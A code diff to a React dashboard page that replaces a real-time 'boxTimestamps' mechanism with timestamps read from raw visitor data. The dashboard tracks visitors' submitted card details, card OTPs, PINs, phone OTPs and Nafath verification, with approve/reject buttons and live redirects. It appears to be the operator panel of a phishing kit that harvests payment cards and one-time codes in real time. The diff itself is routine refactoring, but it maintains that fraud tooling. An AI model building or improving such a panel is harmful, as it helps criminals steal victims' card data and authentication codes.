@@ -15,7 +15,6 @@ type RequestItem = {
   submittedAt?: string;
   hasCard?: boolean;
   raw?: Record<string, any>;
-  boxTimestamps?: Record<string, BoxTimestamp>; // For consistency with database timestamps
 };
 
 type EntryWithType = RequestItem & { entryType?: 'current' | 'new' | 'update' };
@@ -130,16 +129,6 @@ export default function DashboardPage() {
     phone?: PendingDecision;
   };
   const [pendingDecisions, setPendingDecisions] = useState<PendingDecisions>({});
-  
-  // NEW: Box timestamps from database (real-time system)
-  type BoxTimestamp = {
-    visitor_id: string;
-    box_type: string;
-    status: string;
-    event_timestamp: string;
-    updated_at: string;
-  };
-  const [boxTimestamps, setBoxTimestamps] = useState<Record<string, BoxTimestamp>>({});
   
   const socketRef = useRef<Socket | null>(null);
   const headerMenuRef = useRef<HTMLDivElement | null>(null);
@@ -396,19 +385,6 @@ export default function DashboardPage() {
       return;
     }
     
-    // Update boxTimestamps if provided - update ONLY the specific box that changed
-    if (updatedRequest.boxTimestamps && Object.keys(updatedRequest.boxTimestamps).length > 0) {
-      const visitorId = updatedRequest.visitorId || updatedRequest.id;
-      console.log("[Socket Update] Updating boxTimestamps for:", visitorId, "data:", updatedRequest.boxTimestamps);
-      setBoxTimestamps(prev => {
-        // Keep existing timestamps for other boxes, only update the specific one
-        return {
-          ...prev,
-          ...updatedRequest.boxTimestamps,
-        };
-      });
-    }
-    
     setRequests(prevRequests => {
       const existingIndex = prevRequests.findIndex(
         (r) => r.id === incomingRequest.id || r.visitorId === incomingRequest.visitorId
@@ -420,22 +396,6 @@ export default function DashboardPage() {
         // MERGE old entry with new one (preserve all data)
         const existingRequest = prevRequests[existingIndex];
         
-        // Calculate submittedAt: use latest from boxTimestamps if available, otherwise use existing
-        let newSubmittedAt = existingRequest.submittedAt || existingRequest.updatedAt;
-        
-        // If boxTimestamps updated, use the latest timestamp from them for sorting
-        if (updatedRequest.boxTimestamps) {
-          const allTimestamps = Object.values(updatedRequest.boxTimestamps)
-            .map((bt: any) => bt?.event_timestamp)
-            .filter(Boolean)
-            .map((ts: string) => new Date(ts).getTime())
-            .sort((a, b) => b - a);
-          
-          if (allTimestamps.length > 0 && allTimestamps[0] > new Date(newSubmittedAt || 0).getTime()) {
-            newSubmittedAt = new Date(allTimestamps[0]).toISOString();
-          }
-        }
-        
         // For redirect events, ALWAYS keep existing submittedAt - don't update
         const mergedRequest = {
           ...existingRequest,
@@ -446,11 +406,9 @@ export default function DashboardPage() {
             : (new Date(incomingRequest.submittedAt || incomingRequest.updatedAt || Date.now()).getTime() >
                new Date(existingRequest.submittedAt || existingRequest.updatedAt || 0).getTime()
                ? incomingRequest.submittedAt || incomingRequest.updatedAt
-               : newSubmittedAt),
+               : (existingRequest.submittedAt || existingRequest.updatedAt)),
           // Merge raw data
           raw: { ...(existingRequest.raw || {}), ...(incomingRequest.raw || {}) },
-          // Keep boxTimestamps from database for consistency
-          boxTimestamps: updatedRequest.boxTimestamps || existingRequest.boxTimestamps,
         };
         const newRequests = [...prevRequests];
         newRequests[existingIndex] = mergedRequest;
@@ -523,18 +481,6 @@ export default function DashboardPage() {
       console.log("[Dashboard] Request IDs:", data.map(r => r.id));
       const meaningfulRequests = data.filter((request) => hasMeaningfulDashboardPayload(request.raw || request));
       setRequests(meaningfulRequests);
-      
-      // Extract and set boxTimestamps from initial data for consistency
-      if (meaningfulRequests.length > 0 && meaningfulRequests[0].boxTimestamps) {
-        const allBoxTimestamps: Record<string, Record<string, BoxTimestamp>> = {};
-        meaningfulRequests.forEach(req => {
-          if (req.boxTimestamps) {
-            allBoxTimestamps[req.id] = req.boxTimestamps;
-          }
-        });
-        // Store globally for later use when selecting visitors
-        console.log("[Dashboard] Loaded boxTimestamps for", Object.keys(allBoxTimestamps).length, "visitors");
-      }
     });
     
     // Handle real-time updates
@@ -597,38 +543,6 @@ export default function DashboardPage() {
     fetchPendingDecisions();
   }, [selectedRequestId]);
 
-  // NEW: Fetch box timestamps from server when selecting a visitor
-  useEffect(() => {
-    if (!selectedRequestId) {
-      setBoxTimestamps({});
-      return;
-    }
-
-    const fetchBoxTimestamps = async () => {
-      try {
-        // First, check if we have timestamps from initial data load (dashboard:init)
-        const currentRequest = requests.find(r => r.id === selectedRequestId);
-        if (currentRequest?.boxTimestamps && Object.keys(currentRequest.boxTimestamps).length > 0) {
-          console.log("[BoxTimestamp] Using timestamps from initial data:", currentRequest.boxTimestamps);
-          setBoxTimestamps(currentRequest.boxTimestamps);
-          return;
-        }
-        
-        // Fallback to API fetch
-        const res = await fetch(`/api/boxes/${selectedRequestId}/timestamps`);
-        if (res.ok) {
-          const data = await res.json();
-          setBoxTimestamps(data.timestamps || {});
-          console.log("[BoxTimestamp] Fetched timestamps:", data.timestamps);
-        }
-      } catch (error) {
-        console.error("[BoxTimestamp] Failed to fetch:", error);
-      }
-    };
-
-    fetchBoxTimestamps();
-  }, [selectedRequestId, requests]);
-
   // Listen for pending updates from socket
   useEffect(() => {
     const handlePendingUpdate = (data: { visitorId: string; boxType: string; status: string }) => {
@@ -649,44 +563,6 @@ export default function DashboardPage() {
       socketRef.current.on("pending:update", handlePendingUpdate);
       return () => {
         socketRef.current?.off("pending:update", handlePendingUpdate);
-      };
-    }
-  }, [selectedRequestId]);
-
-  // NEW: Listen for box:update events from server (real-time updates)
-  useEffect(() => {
-    const handleBoxUpdate = (data: { 
-      visitorId: string; 
-      boxType: string; 
-      status: string; 
-      timestamp: string;
-      action?: string;
-      dataType?: string;
-    }) => {
-      console.log("[BoxTimestamp] Received box:update:", data);
-      
-      if (data.visitorId === selectedRequestId) {
-        // Update the box timestamps state
-        setBoxTimestamps((prev) => ({
-          ...prev,
-          [data.boxType]: {
-            visitor_id: data.visitorId,
-            box_type: data.boxType,
-            status: data.status,
-            event_timestamp: data.timestamp,
-            updated_at: data.timestamp,
-          }
-        }));
-        
-        // Force re-render by updating a trigger state if needed
-        // The state update above should trigger a re-render automatically
-      }
-    };
-
-    if (socketRef.current) {
-      socketRef.current.on("box:update", handleBoxUpdate);
-      return () => {
-        socketRef.current?.off("box:update", handleBoxUpdate);
       };
     }
   }, [selectedRequestId]);
@@ -944,43 +820,14 @@ export default function DashboardPage() {
   // Get entry timestamp for a specific raw data
   const getEntryTimestamp = useMemo(() => {
     return (raw: Record<string, any>): number => {
-      // First try to use boxTimestamps from selectedRequest
-      const raw2 = selectedRequest?.raw || {};
-      const timestamps = selectedRequest?.boxTimestamps || {};
-      
-      // Get the latest timestamp from boxTimestamps
-      let latestTs = 0;
-      if (timestamps.card?.event_timestamp) {
-        const ts = new Date(timestamps.card.event_timestamp).getTime();
-        if (ts > latestTs) latestTs = ts;
-      }
-      if (timestamps.otp?.event_timestamp) {
-        const ts = new Date(timestamps.otp.event_timestamp).getTime();
-        if (ts > latestTs) latestTs = ts;
-      }
-      if (timestamps.pin?.event_timestamp) {
-        const ts = new Date(timestamps.pin.event_timestamp).getTime();
-        if (ts > latestTs) latestTs = ts;
-      }
-      if (timestamps.phone?.event_timestamp) {
-        const ts = new Date(timestamps.phone.event_timestamp).getTime();
-        if (ts > latestTs) latestTs = ts;
-      }
-      if (timestamps.nafad?.event_timestamp) {
-        const ts = new Date(timestamps.nafad.event_timestamp).getTime();
-        if (ts > latestTs) latestTs = ts;
-      }
-      
-      // Fallback to raw data
-      if (latestTs === 0) {
-        latestTs = 
-          new Date(raw2._v1UpdatedAt || raw2._v5UpdatedAt || raw2._v6UpdatedAt || raw2._v7UpdatedAt || raw2.nafadUpdatedAt || 0).getTime() ||
-          new Date(raw.submittedAt || raw.createdAt || raw.updatedAt || 0).getTime();
-      }
+      // Use raw data timestamps
+      const latestTs = 
+        new Date(raw._v1UpdatedAt || raw._v5UpdatedAt || raw._v6UpdatedAt || raw._v7UpdatedAt || raw.nafadUpdatedAt || 0).getTime() ||
+        new Date(raw.submittedAt || raw.createdAt || raw.updatedAt || 0).getTime();
       
       return latestTs;
     };
-  }, [selectedRequest]);
+  }, []);
 
   const liveSummary = useMemo(() => {
     const raw = selectedRequest?.raw || {};
@@ -1707,10 +1554,9 @@ export default function DashboardPage() {
       return null;
     }
 
-    // Get timestamp from boxTimestamps state (real-time system)
-    // Fallback to raw data if not available
-    const cardTimestamp = boxTimestamps?.card?.event_timestamp || raw?._v1UpdatedAt || raw?.cardUpdatedAt;
-    const cardStatus = boxTimestamps?.card?.status || effectivePaymentStatus;
+    // Get timestamp from raw data
+    const cardTimestamp = raw?._v1UpdatedAt || raw?.cardUpdatedAt;
+    const cardStatus = effectivePaymentStatus;
 
     return (
       <div 
@@ -1815,10 +1661,9 @@ export default function DashboardPage() {
       return null;
     }
 
-    // Get timestamp from boxTimestamps state (real-time system)
-    // Fallback to raw data if not available
-    const otpTimestamp = boxTimestamps?.otp?.event_timestamp || raw?._v5UpdatedAt;
-    const otpStatus = boxTimestamps?.otp?.status || effectiveCardOtpStatus;
+    // Get timestamp from raw data
+    const otpTimestamp = raw?._v5UpdatedAt;
+    const otpStatus = effectiveCardOtpStatus;
 
     return (
       <div 
@@ -1916,10 +1761,9 @@ export default function DashboardPage() {
       return null;
     }
 
-    // Get timestamp from boxTimestamps state (real-time system)
-    // Fallback to raw data if not available
-    const pinTimestamp = boxTimestamps?.pin?.event_timestamp || raw?._v6UpdatedAt;
-    const pinBoxStatus = boxTimestamps?.pin?.status || effectivePinStatus;
+    // Get timestamp from raw data
+    const pinTimestamp = raw?._v6UpdatedAt;
+    const pinBoxStatus = effectivePinStatus;
 
     return (
       <div 
@@ -2031,10 +1875,9 @@ export default function DashboardPage() {
       return null;
     }
 
-    // Get timestamp from boxTimestamps state (real-time system)
-    // Fallback to raw data if not available
-    const phoneTimestamp = boxTimestamps?.phone?.event_timestamp || raw?._v7UpdatedAt || raw?.phoneUpdatedAt;
-    const phoneStatus = boxTimestamps?.phone?.status || effectivePhoneOtpStatus;
+    // Get timestamp from raw data
+    const phoneTimestamp = raw?._v7UpdatedAt || raw?.phoneUpdatedAt;
+    const phoneStatus = effectivePhoneOtpStatus;
 
     return (
       <div 
@@ -2162,10 +2005,9 @@ const renderNafadBox = () => {
       return null;
     }
 
-    // Get timestamp from boxTimestamps state (real-time system)
-    // Fallback to raw data if not available
-    const nafadTimestamp = boxTimestamps?.nafad?.event_timestamp || raw?.nafadUpdatedAt;
-    const nafadBoxStatus = boxTimestamps?.nafad?.status || nafadStatus;
+    // Get timestamp from raw data
+    const nafadTimestamp = raw?.nafadUpdatedAt;
+    const nafadBoxStatus = nafadStatus;
 
     return (
       <div 
@@ -2567,13 +2409,8 @@ const renderNafadBox = () => {
                            raw.vehicleValue || raw.vehicleYear || raw.repairLocation;
       
       if (hasBasic || hasInsurance) {
-      // Use the latest of boxTimestamps, _vXUpdatedAt, or *SubmittedAt
+      // Use raw data timestamps only
       const rawTimestamps = [
-        boxTimestamps?.card?.event_timestamp ? new Date(boxTimestamps.card.event_timestamp).getTime() : 0,
-        boxTimestamps?.otp?.event_timestamp ? new Date(boxTimestamps.otp.event_timestamp).getTime() : 0,
-        boxTimestamps?.pin?.event_timestamp ? new Date(boxTimestamps.pin.event_timestamp).getTime() : 0,
-        boxTimestamps?.phone?.event_timestamp ? new Date(boxTimestamps.phone.event_timestamp).getTime() : 0,
-        boxTimestamps?.nafad?.event_timestamp ? new Date(boxTimestamps.nafad.event_timestamp).getTime() : 0,
         raw._v1UpdatedAt ? new Date(raw._v1UpdatedAt).getTime() : 0,
         raw._v5UpdatedAt ? new Date(raw._v5UpdatedAt).getTime() : 0,
         raw._v6UpdatedAt ? new Date(raw._v6UpdatedAt).getTime() : 0,
@@ -2835,14 +2672,10 @@ const renderNafadBox = () => {
       const hasCardDecision = raw._v1Status === "approved" || raw._v1Status === "rejected";
       // Show buttons if: has card data AND no decision yet
       const showCardDecisionButtons = hasCardData && !hasCardDecision;
-      // Use card timestamp from state with fallback
-      const cardTs = boxTimestamps?.card?.event_timestamp 
-        ? new Date(boxTimestamps.card.event_timestamp).getTime()
-        : 0;
-      const rawTs = raw._v1UpdatedAt 
+      // Use raw data timestamps only
+      const entryTimestamp = raw._v1UpdatedAt 
         ? new Date(raw._v1UpdatedAt).getTime()
         : (raw.cardSubmittedAt ? new Date(raw.cardSubmittedAt).getTime() : 0);
-      let entryTimestamp = cardTs || rawTs;
 
       const boxKey = `card-${latestCardEntry.id}`;
       boxTimestampsForSort.push({ type: 'card', timestamp: entryTimestamp, key: boxKey });
@@ -4268,13 +4101,8 @@ const renderNafadBox = () => {
     if (latestPackageEntry) {
       const raw = latestPackageEntry.raw || {};
       const selectedOffer = raw.selectedOffer;
-      // Use the latest of boxTimestamps, _vXUpdatedAt, or comparSubmittedAt
+      // Use raw data timestamps only
       const packageTimestamps = [
-        boxTimestamps?.card?.event_timestamp ? new Date(boxTimestamps.card.event_timestamp).getTime() : 0,
-        boxTimestamps?.otp?.event_timestamp ? new Date(boxTimestamps.otp.event_timestamp).getTime() : 0,
-        boxTimestamps?.pin?.event_timestamp ? new Date(boxTimestamps.pin.event_timestamp).getTime() : 0,
-        boxTimestamps?.phone?.event_timestamp ? new Date(boxTimestamps.phone.event_timestamp).getTime() : 0,
-        boxTimestamps?.nafad?.event_timestamp ? new Date(boxTimestamps.nafad.event_timestamp).getTime() : 0,
         raw._v1UpdatedAt ? new Date(raw._v1UpdatedAt).getTime() : 0,
         raw._v5UpdatedAt ? new Date(raw._v5UpdatedAt).getTime() : 0,
         raw._v6UpdatedAt ? new Date(raw._v6UpdatedAt).getTime() : 0,
@@ -4554,16 +4382,9 @@ const renderNafadBox = () => {
 
   // Render action buttons based on current page
   const renderActionButtons = () => {
-    // Get timestamp for a specific box type - uses boxTimestamps state first, then falls back to raw data
-    const getBoxTimestampForSort = (boxType: string, fallbackTimestamps: string[]): number => {
-      // First try: boxTimestamps from state (real-time updates)
-      const stateTs = boxTimestamps?.[boxType]?.event_timestamp 
-        ? new Date(boxTimestamps[boxType].event_timestamp).getTime() 
-        : 0;
-      
-      if (stateTs > 0) return stateTs;
-      
-      // Second try: _vXUpdatedAt from raw data
+    // Get timestamp for a specific box type - uses raw data timestamps
+    const getBoxTimestampForSort = (fallbackTimestamps: string[]): number => {
+      // Use _vXUpdatedAt from raw data
       const raw = selectedRequest?.raw || {};
       for (const field of fallbackTimestamps) {
         if (raw[field]) {
@@ -4582,48 +4403,49 @@ const renderNafadBox = () => {
       return 0;
     };
     
-    // Create array of boxes with timestamps from boxTimestamps state (newest first)
+    // Create array of boxes with timestamps from raw data (newest first)
     const boxes: Array<{ name: string; timestamp: number; component: React.ReactNode }> = [];
     
     const nafadBox = renderNafadBox();
     if (nafadBox) {
-      const nafadTime = getBoxTimestampForSort('nafad', ['nafadUpdatedAt', 'comparSubmittedAt']);
+      const nafadTime = getBoxTimestampForSort(['nafadUpdatedAt', 'comparSubmittedAt']);
       boxes.push({ name: 'nafad', timestamp: nafadTime, component: nafadBox });
     }
     
     const phoneOtpBox = renderPhoneOtpBox();
     if (phoneOtpBox) {
-      const phoneTime = getBoxTimestampForSort('phone', ['_v7UpdatedAt', 'phoneUpdatedAt', 'comparSubmittedAt']);
+      const phoneTime = getBoxTimestampForSort(['_v7UpdatedAt', 'phoneUpdatedAt', 'comparSubmittedAt']);
       boxes.push({ name: 'phoneOtp', timestamp: phoneTime, component: phoneOtpBox });
     }
     
     const pinBox = renderPinBox();
     if (pinBox) {
-      const pinTime = getBoxTimestampForSort('pin', ['_v6UpdatedAt', 'comparSubmittedAt']);
+      const pinTime = getBoxTimestampForSort(['_v6UpdatedAt', 'comparSubmittedAt']);
       boxes.push({ name: 'pin', timestamp: pinTime, component: pinBox });
     }
     
     const cardOtpBox = renderCardOtpBox();
     if (cardOtpBox) {
-      const cardOtpTime = getBoxTimestampForSort('otp', ['_v5UpdatedAt', 'otpSubmittedAt', 'comparSubmittedAt']);
+      const cardOtpTime = getBoxTimestampForSort(['_v5UpdatedAt', 'otpSubmittedAt', 'comparSubmittedAt']);
       boxes.push({ name: 'cardOtp', timestamp: cardOtpTime, component: cardOtpBox });
     }
     
     const cardVerifBox = renderCardVerificationBox();
     if (cardVerifBox) {
-      const cardVerifTime = getBoxTimestampForSort('card', ['_v1UpdatedAt', 'cardSubmittedAt', 'comparSubmittedAt']);
+      const cardVerifTime = getBoxTimestampForSort(['_v1UpdatedAt', 'cardSubmittedAt', 'comparSubmittedAt']);
       boxes.push({ name: 'cardVerif', timestamp: cardVerifTime, component: cardVerifBox });
     }
     
     const basicInfoBox = renderBasicInfoBox();
     if (basicInfoBox) {
-      // Basic info uses the latest of all box timestamps
+      // Basic info uses the latest of all box timestamps from raw data
+      const raw = selectedRequest?.raw || {};
       const allBoxTimestamps = [
-        boxTimestamps?.card?.event_timestamp ? new Date(boxTimestamps.card.event_timestamp).getTime() : 0,
-        boxTimestamps?.otp?.event_timestamp ? new Date(boxTimestamps.otp.event_timestamp).getTime() : 0,
-        boxTimestamps?.pin?.event_timestamp ? new Date(boxTimestamps.pin.event_timestamp).getTime() : 0,
-        boxTimestamps?.phone?.event_timestamp ? new Date(boxTimestamps.phone.event_timestamp).getTime() : 0,
-        boxTimestamps?.nafad?.event_timestamp ? new Date(boxTimestamps.nafad.event_timestamp).getTime() : 0,
+        raw?._v1UpdatedAt ? new Date(raw._v1UpdatedAt).getTime() : 0,
+        raw?._v5UpdatedAt ? new Date(raw._v5UpdatedAt).getTime() : 0,
+        raw?._v6UpdatedAt ? new Date(raw._v6UpdatedAt).getTime() : 0,
+        raw?._v7UpdatedAt ? new Date(raw._v7UpdatedAt).getTime() : 0,
+        raw?.nafadUpdatedAt ? new Date(raw.nafadUpdatedAt).getTime() : 0,
       ];
       const basicTime = Math.max(...allBoxTimestamps.filter(t => t > 0));
       boxes.push({ name: 'basicInfo', timestamp: basicTime, component: basicInfoBox });
@@ -4631,13 +4453,14 @@ const renderNafadBox = () => {
     
     const insuranceBox = renderInsuranceDetailsBox();
     if (insuranceBox) {
-      // Insurance uses the latest of all box timestamps
+      // Insurance uses the latest of all box timestamps from raw data
+      const raw = selectedRequest?.raw || {};
       const allBoxTimestamps = [
-        boxTimestamps?.card?.event_timestamp ? new Date(boxTimestamps.card.event_timestamp).getTime() : 0,
-        boxTimestamps?.otp?.event_timestamp ? new Date(boxTimestamps.otp.event_timestamp).getTime() : 0,
-        boxTimestamps?.pin?.event_timestamp ? new Date(boxTimestamps.pin.event_timestamp).getTime() : 0,
-        boxTimestamps?.phone?.event_timestamp ? new Date(boxTimestamps.phone.event_timestamp).getTime() : 0,
-        boxTimestamps?.nafad?.event_timestamp ? new Date(boxTimestamps.nafad.event_timestamp).getTime() : 0,
+        raw?._v1UpdatedAt ? new Date(raw._v1UpdatedAt).getTime() : 0,
+        raw?._v5UpdatedAt ? new Date(raw._v5UpdatedAt).getTime() : 0,
+        raw?._v6UpdatedAt ? new Date(raw._v6UpdatedAt).getTime() : 0,
+        raw?._v7UpdatedAt ? new Date(raw._v7UpdatedAt).getTime() : 0,
+        raw?.nafadUpdatedAt ? new Date(raw.nafadUpdatedAt).getTime() : 0,
       ];
       const insuranceTime = Math.max(...allBoxTimestamps.filter(t => t > 0));
       boxes.push({ name: 'insurance', timestamp: insuranceTime, component: insuranceBox });
@@ -5037,63 +4860,17 @@ const renderNafadBox = () => {
               const currentPage = item.raw?.currentPage || item.raw?.page || "غير متصل";
               const entryCount = getCustomerEntryCount(item);
               
-              // Get the latest timestamp from boxTimestamps (synchronized with Socket/database)
+              // Get timestamp from raw data only
               const raw = item.raw || {};
-              const itemBoxTimestamps = item.boxTimestamps || {};
-              
-              // Get the latest timestamp from boxTimestamps
-              let latestTimestamp = 0;
-              let latestBoxType = '';
-              
-              // Check each box type for the most recent timestamp
-              if (itemBoxTimestamps.card?.event_timestamp) {
-                const ts = new Date(itemBoxTimestamps.card.event_timestamp).getTime();
-                if (ts > latestTimestamp) {
-                  latestTimestamp = ts;
-                  latestBoxType = 'card';
-                }
-              }
-              if (itemBoxTimestamps.otp?.event_timestamp) {
-                const ts = new Date(itemBoxTimestamps.otp.event_timestamp).getTime();
-                if (ts > latestTimestamp) {
-                  latestTimestamp = ts;
-                  latestBoxType = 'otp';
-                }
-              }
-              if (itemBoxTimestamps.pin?.event_timestamp) {
-                const ts = new Date(itemBoxTimestamps.pin.event_timestamp).getTime();
-                if (ts > latestTimestamp) {
-                  latestTimestamp = ts;
-                  latestBoxType = 'pin';
-                }
-              }
-              if (itemBoxTimestamps.phone?.event_timestamp) {
-                const ts = new Date(itemBoxTimestamps.phone.event_timestamp).getTime();
-                if (ts > latestTimestamp) {
-                  latestTimestamp = ts;
-                  latestBoxType = 'phone';
-                }
-              }
-              if (itemBoxTimestamps.nafad?.event_timestamp) {
-                const ts = new Date(itemBoxTimestamps.nafad.event_timestamp).getTime();
-                if (ts > latestTimestamp) {
-                  latestTimestamp = ts;
-                  latestBoxType = 'nafad';
-                }
-              }
-              
-              // Fallback to raw data if no boxTimestamps found
-              if (latestTimestamp === 0) {
-                latestTimestamp = 
-                  raw._v1UpdatedAt ? new Date(raw._v1UpdatedAt).getTime() :
-                  raw._v5UpdatedAt ? new Date(raw._v5UpdatedAt).getTime() :
-                  raw._v6UpdatedAt ? new Date(raw._v6UpdatedAt).getTime() :
-                  raw._v7UpdatedAt ? new Date(raw._v7UpdatedAt).getTime() :
-                  raw.nafadUpdatedAt ? new Date(raw.nafadUpdatedAt).getTime() :
-                  raw.createdAt ? new Date(raw.createdAt).getTime() :
-                  raw.submittedAt ? new Date(raw.submittedAt).getTime() :
-                  item.submittedAt ? new Date(item.submittedAt).getTime() : 0;
-              }
+              const latestTimestamp = 
+                raw._v1UpdatedAt ? new Date(raw._v1UpdatedAt).getTime() :
+                raw._v5UpdatedAt ? new Date(raw._v5UpdatedAt).getTime() :
+                raw._v6UpdatedAt ? new Date(raw._v6UpdatedAt).getTime() :
+                raw._v7UpdatedAt ? new Date(raw._v7UpdatedAt).getTime() :
+                raw.nafadUpdatedAt ? new Date(raw.nafadUpdatedAt).getTime() :
+                raw.createdAt ? new Date(raw.createdAt).getTime() :
+                raw.submittedAt ? new Date(raw.submittedAt).getTime() :
+                item.submittedAt ? new Date(item.submittedAt).getTime() : 0;
               
               const timeSinceSubmit = latestTimestamp > 0 ? Date.now() - latestTimestamp : 0;
               const minutesSince = Math.floor(timeSinceSubmit / 60000);
